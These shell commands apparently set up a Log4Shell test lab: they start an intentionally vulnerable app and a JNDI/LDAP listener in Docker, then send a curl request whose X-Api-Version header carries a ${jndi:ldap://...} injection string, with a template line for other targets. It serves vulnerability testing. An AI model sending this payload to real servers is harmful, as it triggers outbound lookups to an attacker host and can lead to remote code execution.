```
docker run -p 8080:8080 --name vulnerable-app ghcr.io/igormv28/vulnerable-app

docker run -P --name jndi ghcr.io/igormv28/jndi

docker inspect jndi |grep IPAddress
            "SecondaryIPAddresses": null,
            "IPAddress": "172.17.0.2",
                    "IPAddress": "172.17.0.2",

curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.2:1389/If_JNDI_Received_Then_Vulnerable}'
```
curl <app_url:port> -H 'X-Api-Version: ${jndi:ldap://<JNDI_IP:1389/If_JNDI_Received_Then_Vulnerable}'
